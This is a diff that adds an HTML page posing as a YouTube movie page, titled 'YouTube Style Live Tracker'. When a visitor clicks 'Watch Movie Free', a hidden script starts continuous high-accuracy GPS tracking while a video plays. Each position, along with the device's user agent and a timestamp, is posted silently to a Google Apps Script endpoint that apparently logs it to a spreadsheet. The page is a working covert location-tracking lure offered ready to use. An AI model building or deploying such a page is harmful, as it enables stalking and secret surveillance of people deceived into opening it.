@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>YouTube Style Live Tracker</title>
+<style>
+    body { margin:0; font-family:Arial; background:#f9f9f9; }
+    .header { display:flex; align-items:center; padding:12px; background:#fff; box-shadow:0 2px 6px rgba(0,0,0,0.1);}
+    .logo { font-size:22px; font-weight:bold; color:#ff0000;}
+    .container { padding:15px; display:grid; gap:20px; }
+    .video-card { background:#fff; border-radius:12px; box-shadow:0 2px 10px rgba(0,0,0,0.1); padding:10px; text-align:center; }
+    .thumb { width:100%; border-radius:12px; }
+    .title { font-size:18px; font-weight:bold; margin-top:10px; color:#333; }
+    .watch-btn { margin-top:10px; background:#ff0000; color:#fff; padding:10px 15px; border-radius:8px; font-size:16px; border:none; cursor:pointer; width:100%; }
+    .modal { display:none; position:fixed; z-index:9999; left:0; top:0; width:100%; height:100%; background:rgba(0,0,0,0.7); justify-content:center; align-items:center; }
+    .modal-content { width:320px; background:white; border-radius:15px; padding:20px; text-align:center; animation:fadeIn 0.4s ease; }
+    @keyframes fadeIn { from {opacity:0; transform:scale(0.8);} to {opacity:1; transform:scale(1);} }
+    .popup-img { width:100%; border-radius:8px; }
+    #map { width:100%; height:350px; margin-top:20px; border-radius:12px; }
+    #videoPlayer { width:100%; height:320px; margin-top:20px; border-radius:12px; display:none; border:none; }
+</style>
+</head>
+<body>
+
+<div class="header"><div class="logo">YouTube</div></div>
+
+<div class="container">
+    <div class="video-card">
+        <img class="thumb" src="https://i.imgur.com/2vhCbMG.jpeg" alt="Avatar Fire">
+        <div class="title">Avatar Fire – Action Adventure</div>
+        <button class="watch-btn" onclick="showPopup('Avatar Fire','https://i.imgur.com/z7uQq2R.png','https://www.youtube.com/embed/Ma1x7ikpid8')">Watch Now</button>
+    </div>
+    <div class="video-card">
+        <img class="thumb" src="https://i.imgur.com/3G1Y7Lp.jpeg" alt="Space Heroes">
+        <div class="title">Space Heroes – Sci-Fi Thriller</div>
+        <button class="watch-btn" onclick="showPopup('Space Heroes','https://i.imgur.com/8m6tq9K.png','https://www.youtube.com/embed/VIDEO_ID_HERE')">Watch Now</button>
+    </div>
+</div>
+
+<div id="popup" class="modal">
+    <div class="modal-content">
+        <img id="popupImg" src="" class="popup-img">
+        <h3 id="popupTitle"></h3>
+        <p>Watch the most exciting movie now!</p>
+        <button class="watch-btn" onclick="startMovie()">Watch Movie Free</button>
+    </div>
+</div>
+
+<iframe id="videoPlayer" src="" allow="accelerometer; autoplay; encrypted-media; gyroscope;" allowfullscreen></iframe>
+
+<div id="map"></div>
+
+<script>
+const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxbNggv4swqY3DKOPT7c9fdlw-gigzpq4B3mczcmCY1ztK8Wg-xb6-cP35QGRup5MpR/exec";
+
+let map, marker, circle;
+let currentVideo = "";
+
+// SHOW POPUP
+function showPopup(title,img,videoUrl){
+    document.getElementById('popupTitle').innerText = title;
+    document.getElementById('popupImg').src = img;
+    currentVideo = videoUrl;
+    document.getElementById('popup').style.display = 'flex';
+}
+
+// SAVE LOCATION TO SHEET
+function saveToSheet(lat, lng, acc) {
+    fetch(WEB_APP_URL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            latitude: lat,
+            longitude: lng,
+            accuracy: acc,
+            device: navigator.userAgent,
+            time: new Date().toLocaleString()
+        })
+    });
+}
+
+// INIT GOOGLE MAP
+function initMap(lat, lng, accuracy) {
+    map = new google.maps.Map(document.getElementById("map"), {
+        center: { lat, lng },
+        zoom: 19
+    });
+
+    marker = new google.maps.Marker({ 
+        position: { lat, lng }, 
+        map: map, 
+        title: "Your Device",
+        animation: google.maps.Animation.DROP
+    });
+
+    circle = new google.maps.Circle({
+        map: map,
+        center: { lat, lng },
+        radius: accuracy,
+        fillColor: "#4285F4",
+        fillOpacity: 0.3,
+        strokeColor: "#4285F4",
+        strokeOpacity: 0.9,
+        strokeWeight: 2,
+    });
+}
+
+// START MOVIE + TRACK LOCATION
+function startMovie() {
+    document.getElementById("popup").style.display = "none";
+    const video = document.getElementById("videoPlayer");
+    video.src = currentVideo + "?autoplay=1";
+    video.style.display = "block";
+
+    if (navigator.geolocation) {
+        navigator.geolocation.watchPosition(
+            (pos) => {
+                const lat = pos.coords.latitude;
+                const lng = pos.coords.longitude;
+
+                // Set circle radius between 10-20 meters
+                let acc = pos.coords.accuracy;
+                acc = Math.min(Math.max(acc, 10), 20);
+
+                // Save exact location to Google Sheet
+                saveToSheet(lat, lng, acc);
+
+                if (!map) {
+                    initMap(lat, lng, acc);
+                } else {
+                    marker.setPosition({ lat, lng });
+                    circle.setCenter({ lat, lng });
+                    circle.setRadius(acc);
+                    map.panTo({ lat, lng });
+                }
+            },
+            (err) => alert("Please enable GPS and allow location access."),
+            { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+        );
+    } else {
+        alert("Geolocation is not supported by your browser.");
+    }
+}
+</script>
+
+<script src="https://maps.googleapis.com/maps/api/js?key=YOUR_MAP_API_KEY"></script>
+</body>
+</html>
